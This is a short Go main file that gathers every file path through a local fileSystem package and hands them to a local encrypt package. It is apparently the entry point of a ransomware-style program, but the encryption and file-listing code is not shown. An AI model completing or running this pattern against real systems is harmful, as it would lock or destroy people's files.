package main

import (
	"./encrypt"
	"./fileSystem"
)

func main() {
	filePath := fileSystem.GetAllFile()
	encrypt.Run(filePath)
}
